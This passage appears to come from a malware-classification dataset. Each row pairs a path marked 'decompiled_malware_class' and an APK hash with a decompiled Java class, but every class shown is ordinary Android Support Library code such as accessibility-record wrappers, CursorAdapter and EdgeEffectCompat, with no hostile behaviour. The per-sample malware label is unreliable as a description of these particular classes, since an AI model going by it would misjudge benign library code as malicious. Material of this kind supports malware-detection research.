((AccessibilityRecord)record).setRemovedCount(removedCount);   }   public static void setScrollX(  Object record,  int scrollX){     ((AccessibilityRecord)record).setScrollX(scrollX);   }   public static void setScrollY(  Object record,  int scrollY){     ((AccessibilityRecord)record).setScrollY(scrollY);   }   public static void setScrollable(  Object record,  boolean scrollable){     ((AccessibilityRecord)record).setScrollable(scrollable);   }   public static void setSource(  Object record,  View source){     ((AccessibilityRecord)record).setSource(source);   }   public static void setToIndex(  Object record,  int toIndex){     ((AccessibilityRecord)record).setToIndex(toIndex);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object record){     return ((AccessibilityRecord)record).getMaxScrollX();   }   public static int getMaxScrollY(  Object record){     return ((AccessibilityRecord)record).getMaxScrollY();   }   public static void setMaxScrollX(  Object record,  int maxScrollX){     ((AccessibilityRecord)record).setMaxScrollX(maxScrollX);   }   public static void setMaxScrollY(  Object record,  int maxScrollY){     ((AccessibilityRecord)record).setMaxScrollY(maxScrollY);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object record,  View root,  int virtualDescendantId){     ((AccessibilityRecord)record).setSource(root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordIcsImpl.code","static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object record){     return AccessibilityRecordCompatIcs.obtain(record);   }   @Override public int getAddedCount(  Object record){     return AccessibilityRecordCompatIcs.getAddedCount(record);   }   @Override public CharSequence getBeforeText(  Object record){     return AccessibilityRecordCompatIcs.getBeforeText(record);   }   @Override public CharSequence getClassName(  Object record){     return AccessibilityRecordCompatIcs.getClassName(record);   }   @Override public CharSequence getContentDescription(  Object record){     return AccessibilityRecordCompatIcs.getContentDescription(record);   }   @Override public int getCurrentItemIndex(  Object record){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);   }   @Override public int getFromIndex(  Object record){     return AccessibilityRecordCompatIcs.getFromIndex(record);   }   @Override public int getItemCount(  Object record){     return AccessibilityRecordCompatIcs.getItemCount(record);   }   @Override public Parcelable getParcelableData(  Object record){     return AccessibilityRecordCompatIcs.getParcelableData(record);   }   @Override public int getRemovedCount(  Object record){     return AccessibilityRecordCompatIcs.getRemovedCount(record);   }   @Override public int getScrollX(  Object record){     return AccessibilityRecordCompatIcs.getScrollX(record);   }   @Override public int getScrollY(  Object record){     return AccessibilityRecordCompatIcs.getScrollY(record);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));   }   @Override public List<CharSequence> getText(  Object record){     return AccessibilityRecordCompatIcs.getText(record);   }   @Override public int getToIndex(  Object record){     return AccessibilityRecordCompatIcs.getToIndex(record);   }   @Override public int getWindowId(  Object record){     return AccessibilityRecordCompatIcs.getWindowId(record);   }   @Override public boolean isChecked(  Object record){     return AccessibilityRecordCompatIcs.isChecked(record);   }   @Override public boolean isEnabled(  Object record){     return AccessibilityRecordCompatIcs.isEnabled(record);   }   @Override public boolean isFullScreen(  Object record){     return AccessibilityRecordCompatIcs.isFullScreen(record);   }   @Override public boolean isPassword(  Object record){     return AccessibilityRecordCompatIcs.isPassword(record);   }   @Override public boolean isScrollable(  Object record){     return AccessibilityRecordCompatIcs.isScrollable(record);   }   @Override public void recycle(  Object record){     AccessibilityRecordCompatIcs.recycle(record);   }   @Override public void setAddedCount(  Object record,  int addedCount){     AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){     AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);   }   @Override public void setChecked(  Object record,  boolean isChecked){     AccessibilityRecordCompatIcs.setChecked(record,isChecked);   }   @Override public void setClassName(  Object record,  CharSequence className){     AccessibilityRecordCompatIcs.setClassName(record,className);   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){     AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){     AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);   }   @Override public void setEnabled(  Object record,  boolean isEnabled){     AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);   }   @Override public void setFromIndex(  Object record,  int fromIndex){     AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){     AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);   }   @Override public void setItemCount(  Object record,  int itemCount){     AccessibilityRecordCompatIcs.setItemCount(record,itemCount);   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){     AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);   }   @Override public void setPassword(  Object record,  boolean isPassword){     AccessibilityRecordCompatIcs.setPassword(record,isPassword);   }   @Override public void setRemovedCount(  Object record,  int removedCount){     AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);   }   @Override public void setScrollX(  Object record,  int scrollX){     AccessibilityRecordCompatIcs.setScrollX(record,scrollX);   }   @Override public void setScrollY(  Object record,  int scrollY){     AccessibilityRecordCompatIcs.setScrollY(record,scrollY);   }   @Override public void setScrollable(  Object record,  boolean scrollable){     AccessibilityRecordCompatIcs.setScrollable(record,scrollable);   }   @Override public void setSource(  Object record,  View source){     AccessibilityRecordCompatIcs.setSource(record,source);   }   @Override public void setToIndex(  Object record,  int toIndex){     AccessibilityRecordCompatIcs.setToIndex(record,toIndex);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordIcsMr1Impl.code","static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);   }   @Override public int getMaxScrollY(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordJellyBeanImpl.code","static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){     AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordStubImpl.code","static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object record){     return null;   }   @Override public int getAddedCount(  Object record){     return 0;   }   @Override public CharSequence getBeforeText(  Object record){     return null;   }   @Override public CharSequence getClassName(  Object record){     return null;   }   @Override public CharSequence getContentDescription(  Object record){     return null;   }   @Override public int getCurrentItemIndex(  Object record){     return 0;   }   @Override public int getFromIndex(  Object record){     return 0;   }   @Override public int getItemCount(  Object record){     return 0;   }   @Override public int getMaxScrollX(  Object record){     return 0;   }   @Override public int getMaxScrollY(  Object record){     return 0;   }   @Override public Parcelable getParcelableData(  Object record){     return null;   }   @Override public int getRemovedCount(  Object record){     return 0;   }   @Override public int getScrollX(  Object record){     return 0;   }   @Override public int getScrollY(  Object record){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return null;   }   @Override public List<CharSequence> getText(  Object record){     return Collections.emptyList();   }   @Override public int getToIndex(  Object record){     return 0;   }   @Override public int getWindowId(  Object record){     return 0;   }   @Override public boolean isChecked(  Object record){     return false;   }   @Override public boolean isEnabled(  Object record){     return false;   }   @Override public boolean isFullScreen(  Object record){     return false;   }   @Override public boolean isPassword(  Object record){     return false;   }   @Override public boolean isScrollable(  Object record){     return false;   }   @Override public void recycle(  Object record){   }   @Override public void setAddedCount(  Object record,  int addedCount){   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){   }   @Override public void setChecked(  Object record,  boolean isChecked){   }   @Override public void setClassName(  Object record,  CharSequence className){   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){   }   @Override public void setEnabled(  Object record,  boolean isEnabled){   }   @Override public void setFromIndex(  Object record,  int fromIndex){   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){   }   @Override public void setItemCount(  Object record,  int itemCount){   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){   }   @Override public void setPassword(  Object record,  boolean isPassword){   }   @Override public void setRemovedCount(  Object record,  int removedCount){   }   @Override public void setScrollX(  Object record,  int scrollX){   }   @Override public void setScrollY(  Object record,  int scrollY){   }   @Override public void setScrollable(  Object record,  boolean scrollable){   }   @Override public void setSource(  Object record,  View source){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){   }   @Override public void setToIndex(  Object record,  int toIndex){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityStateChangeListenerBridge.code","interface AccessibilityStateChangeListenerBridge {   void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityStateChangeListenerCompat.code","public static abstract class AccessibilityStateChangeListenerCompat {   final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);   public abstract void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\BaseEdgeEffectImpl.code","static class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){   }   @Override public boolean isFinished(  Object edgeEffect){     return true;   }   @Override public void finish(  Object edgeEffect){   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return false;   }   @Override public boolean onRelease(  Object edgeEffect){     return false;   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return false;   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ChangeObserver.code","public class ChangeObserver extends ContentObserver {   public ChangeObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     CursorAdapter.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\CursorAdapter.code","public abstract class CursorAdapter extends BaseAdapter implements Filterable, CursorFilter.CursorFilterClient {   @Deprecated public static final int FLAG_AUTO_REQUERY=1;   public static final int FLAG_REGISTER_CONTENT_OBSERVER=2;   protected boolean mAutoRequery;   protected ChangeObserver mChangeObserver;   protected Context mContext;   protected Cursor mCursor;   protected CursorFilter mCursorFilter;   protected DataSetObserver mDataSetObserver;   protected boolean mDataValid;   protected FilterQueryProvider mFilterQueryProvider;   protected int mRowIDColumn;   public abstract void bindView(  View view,  Context context,  Cursor cursor);   public abstract View newView(  Context context,  Cursor cursor,  ViewGroup viewGroup);   @Deprecated public CursorAdapter(  Context context,  Cursor c2){     init(context,c2,1);   }   public CursorAdapter(  Context context,  Cursor c2,  boolean autoRequery){     init(context,c2,autoRequery ? 1 : 2);   }   public CursorAdapter(  Context context,  Cursor c2,  int flags){     init(context,c2,flags);   }   @Deprecated protected void init(  Context context,  Cursor c2,  boolean autoRequery){     init(context,c2,autoRequery ? 1 : 2);   }   void init(  Context context,  Cursor c2,  int flags){     if ((flags & 1) == 1) {       flags|=2;       this.mAutoRequery=true;     }  else {       this.mAutoRequery=false;     }     boolean cursorPresent=c2 != null;     this.mCursor=c2;     this.mDataValid=cursorPresent;     this.mContext=context;     this.mRowIDColumn=cursorPresent ? c2.getColumnIndexOrThrow(""_id"") : -1;     if ((flags & 2) == 2) {       this.mChangeObserver=new ChangeObserver();       this.mDataSetObserver=new MyDataSetObserver();     }  else {       this.mChangeObserver=null;       this.mDataSetObserver=null;     }     if (cursorPresent) {       if (this.mChangeObserver != null) {         c2.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         c2.registerDataSetObserver(this.mDataSetObserver);       }     }   }   @Override public Cursor getCursor(){     return this.mCursor;   }   @Override public int getCount(){     if (!this.mDataValid || this.mCursor == null) {       return 0;     }     return this.mCursor.getCount();   }   @Override public Object getItem(  int position){     if (!this.mDataValid || this.mCursor == null) {       return null;     }     this.mCursor.moveToPosition(position);     return this.mCursor;   }   @Override public long getItemId(  int position){     if (this.mDataValid && this.mCursor != null && this.mCursor.moveToPosition(position)) {       return this.mCursor.getLong(this.mRowIDColumn);     }     return 0L;   }   @Override public boolean hasStableIds(){     return true;   }   @Override public View getView(  int position,  View convertView,  ViewGroup parent){     View v;     if (!this.mDataValid) {       throw new IllegalStateException(""this should only be called when the cursor is valid"");     }     if (!this.mCursor.moveToPosition(position)) {       throw new IllegalStateException(""couldn't move cursor to position "" + position);     }     if (convertView == null) {       v=newView(this.mContext,this.mCursor,parent);     }  else {       v=convertView;     }     bindView(v,this.mContext,this.mCursor);     return v;   }   @Override public View getDropDownView(  int position,  View convertView,  ViewGroup parent){     View v;     if (this.mDataValid) {       this.mCursor.moveToPosition(position);       if (convertView == null) {         v=newDropDownView(this.mContext,this.mCursor,parent);       }  else {         v=convertView;       }       bindView(v,this.mContext,this.mCursor);       return v;     }     return null;   }   public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return newView(context,cursor,parent);   }   @Override public void changeCursor(  Cursor cursor){     Cursor old=swapCursor(cursor);     if (old != null) {       old.close();     }   }   public Cursor swapCursor(  Cursor newCursor){     if (newCursor == this.mCursor) {       return null;     }     Cursor oldCursor=this.mCursor;     if (oldCursor != null) {       if (this.mChangeObserver != null) {         oldCursor.unregisterContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         oldCursor.unregisterDataSetObserver(this.mDataSetObserver);       }     }     this.mCursor=newCursor;     if (newCursor != null) {       if (this.mChangeObserver != null) {         newCursor.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         newCursor.registerDataSetObserver(this.mDataSetObserver);       }       this.mRowIDColumn=newCursor.getColumnIndexOrThrow(""_id"");       this.mDataValid=true;       notifyDataSetChanged();       return oldCursor;     }     this.mRowIDColumn=-1;     this.mDataValid=false;     notifyDataSetInvalidated();     return oldCursor;   }   @Override public CharSequence convertToString(  Cursor cursor){     return cursor == null ? """" : cursor.toString();   }   @Override public Cursor runQueryOnBackgroundThread(  CharSequence constraint){     return this.mFilterQueryProvider != null ? this.mFilterQueryProvider.runQuery(constraint) : this.mCursor;   }   @Override public Filter getFilter(){     if (this.mCursorFilter == null) {       this.mCursorFilter=new CursorFilter(this);     }     return this.mCursorFilter;   }   public FilterQueryProvider getFilterQueryProvider(){     return this.mFilterQueryProvider;   }   public void setFilterQueryProvider(  FilterQueryProvider filterQueryProvider){     this.mFilterQueryProvider=filterQueryProvider;   }   protected void onContentChanged(){     if (this.mAutoRequery && this.mCursor != null && !this.mCursor.isClosed()) {       this.mDataValid=this.mCursor.requery();     }   } public class ChangeObserver extends ContentObserver {     public ChangeObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       CursorAdapter.this.onContentChanged();     }   } public class MyDataSetObserver extends DataSetObserver {     private MyDataSetObserver(){     }     @Override public void onChanged(){       CursorAdapter.this.mDataValid=true;       CursorAdapter.this.notifyDataSetChanged();     }     @Override public void onInvalidated(){       CursorAdapter.this.mDataValid=false;       CursorAdapter.this.notifyDataSetInvalidated();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\CursorFilter.code","class CursorFilter extends Filter {   CursorFilterClient mClient; interface CursorFilterClient {     void changeCursor(    Cursor cursor);     CharSequence convertToString(    Cursor cursor);     Cursor getCursor();     Cursor runQueryOnBackgroundThread(    CharSequence charSequence);   }   public CursorFilter(  CursorFilterClient client){     this.mClient=client;   }   @Override public CharSequence convertResultToString(  Object resultValue){     return this.mClient.convertToString((Cursor)resultValue);   }   @Override protected Filter.FilterResults performFiltering(  CharSequence constraint){     Cursor cursor=this.mClient.runQueryOnBackgroundThread(constraint);     Filter.FilterResults results=new Filter.FilterResults();     if (cursor != null) {       results.count=cursor.getCount();       results.values=cursor;     }  else {       results.count=0;       results.values=null;     }     return results;   }   @Override protected void publishResults(  CharSequence constraint,  Filter.FilterResults results){     Cursor oldCursor=this.mClient.getCursor();     if (results.values != null && results.values != oldCursor) {       this.mClient.changeCursor((Cursor)results.values);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\CursorFilterClient.code","interface CursorFilterClient {   void changeCursor(  Cursor cursor);   CharSequence convertToString(  Cursor cursor);   Cursor getCursor();   Cursor runQueryOnBackgroundThread(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\CursorToStringConverter.code","public interface CursorToStringConverter {   CharSequence convertToString(  Cursor cursor); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   } static class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){     }     @Override public boolean isFinished(    Object edgeEffect){       return true;     }     @Override public void finish(    Object edgeEffect){     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return false;     }     @Override public boolean onRelease(    Object edgeEffect){       return false;     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return false;     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return false;     }   } static class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){       EdgeEffectCompatIcs.setSize(edgeEffect,width,height);     }     @Override public boolean isFinished(    Object edgeEffect){       return EdgeEffectCompatIcs.isFinished(edgeEffect);     }     @Override public void finish(    Object edgeEffect){       EdgeEffectCompatIcs.finish(edgeEffect);     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);     }     @Override public boolean onRelease(    Object edgeEffect){       return EdgeEffectCompatIcs.onRelease(edgeEffect);     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return EdgeEffectCompatIcs.draw(edgeEffect,canvas);     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public void setSize(  int width,  int height){     IMPL.setSize(this.mEdgeEffect,width,height);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean onPull(  float deltaDistance){     return IMPL.onPull(this.mEdgeEffect,deltaDistance);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public boolean onAbsorb(  int velocity){     return IMPL.onAbsorb(this.mEdgeEffect,velocity);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static void setSize(  Object edgeEffect,  int width,  int height){     ((EdgeEffect)edgeEffect).setSize(width,height);   }   public static boolean isFinished(  Object edgeEffect){     return ((EdgeEffect)edgeEffect).isFinished();   }   public static void finish(  Object edgeEffect){     ((EdgeEffect)edgeEffect).finish();   }   public static boolean onPull(  Object edgeEffect,  float deltaDistance){     ((EdgeEffect)edgeEffect).onPull(deltaDistance);     return true;   }   public static boolean onRelease(  Object edgeEffect){     EdgeEffect eff=(EdgeEffect)edgeEffect;     eff.onRelease();     return eff.isFinished();   }   public static boolean onAbsorb(  Object edgeEffect,  int velocity){     ((EdgeEffect)edgeEffect).onAbsorb(velocity);     return true;   }   public static boolean draw(  Object edgeEffect,  Canvas canvas){     return ((EdgeEffect)edgeEffect).draw(canvas);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\EdgeEffectIcsImpl.code","static class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){     EdgeEffectCompatIcs.setSize(edgeEffect,width,height);   }   @Override public boolean isFinished(  Object edgeEffect){     return EdgeEffectCompatIcs.isFinished(edgeEffect);   }   @Override public void finish(  Object edgeEffect){     EdgeEffectCompatIcs.finish(edgeEffect);   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);   }   @Override public boolean onRelease(  Object edgeEffect){     return EdgeEffectCompatIcs.onRelease(edgeEffect);   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return EdgeEffectCompatIcs.draw(edgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\MyDataSetObserver.code","public class MyDataSetObserver extends DataSetObserver {   private MyDataSetObserver(){   }   @Override public void onChanged(){     CursorAdapter.this.mDataValid=true;     CursorAdapter.this.notifyDataSetChanged();   }   @Override public void onInvalidated(){     CursorAdapter.this.mDataValid=false;     CursorAdapter.this.notifyDataSetInvalidated();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\OnQueryTextListenerCompat.code","public static abstract class OnQueryTextListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);   public boolean onQueryTextSubmit(  String query){     return false;   }   public boolean onQueryTextChange(  String newText){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\OnQueryTextListenerCompatBridge.code","interface OnQueryTextListenerCompatBridge {   boolean onQueryTextChange(  String str);   boolean onQueryTextSubmit(  String str); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.widget\ResourceCursorAdapter.code","public abstract class ResourceCursorAdapter extends CursorAdapter {   private int mDropDownLayout;   private LayoutInflater mInflater;   private int mLayout;   @Deprecated public ResourceCursorAdapter(  Context context,  int layout,  Cursor c2){     super(context,c2);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c2,  boolean autoRequery){     super(context,c2,autoRequery);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c2,  int flags){     super(context,c2,flags);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   @Override public View newView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mLayout,parent,false);   }   @Override public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mDropDownLayout,parent,false);   }   public void setViewResource(  int layout){     this.mLayout=layout;   }   public void setDropDownViewResource(  int dropDownLayout){     this.mDropDownLayout=dropDownLayout;   } } "
